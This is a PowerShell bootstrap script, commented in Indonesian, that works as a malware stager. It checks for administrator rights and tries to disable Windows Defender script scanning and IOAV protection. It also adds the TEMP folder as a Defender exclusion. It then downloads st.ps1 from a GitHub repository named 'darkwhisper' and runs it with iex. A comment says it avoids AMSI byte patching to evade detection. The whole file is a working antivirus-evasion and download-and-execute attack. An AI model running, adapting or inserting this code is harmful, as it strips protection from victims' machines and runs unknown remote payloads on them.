# b.ps1 - bootstrap: matikan script scanning, lalu muat st.ps1
# Tanpa patch byte AMSI di sini: pola itu yang dikenali Defender.
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$bl = Join-Path $env:TEMP 'b.txt'
Remove-Item $bl -Force
"admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))" | Out-File $bl -Encoding utf8

try { Set-MpPreference -DisableScriptScanning $true -ErrorAction Stop; 'scriptscan off' | Out-File $bl -Append -Encoding utf8 } catch { 'scriptscan gagal' | Out-File $bl -Append -Encoding utf8 }
try { Set-MpPreference -DisableIOAVProtection $true -ErrorAction Stop; 'ioav off' | Out-File $bl -Append -Encoding utf8 } catch { 'ioav gagal' | Out-File $bl -Append -Encoding utf8 }
try { Add-MpPreference -ExclusionPath $env:TEMP -Force -ErrorAction Stop; 'excl ok' | Out-File $bl -Append -Encoding utf8 } catch { 'excl gagal' | Out-File $bl -Append -Encoding utf8 }

$u = 'https://github.com/byteforge0-cloud/darkwhisper/raw/refs/heads/main/st.ps1'
$t = 'https://raw.githubusercontent.com/byteforge0-cloud/darkwhisper/main/st.ps1'
foreach ($x in @($u, $t)) {
    try {
        $s = (New-Object Net.WebClient).DownloadString($x)
        if ($s.Length -gt 500) { iex $s; break }
    } catch { }
}
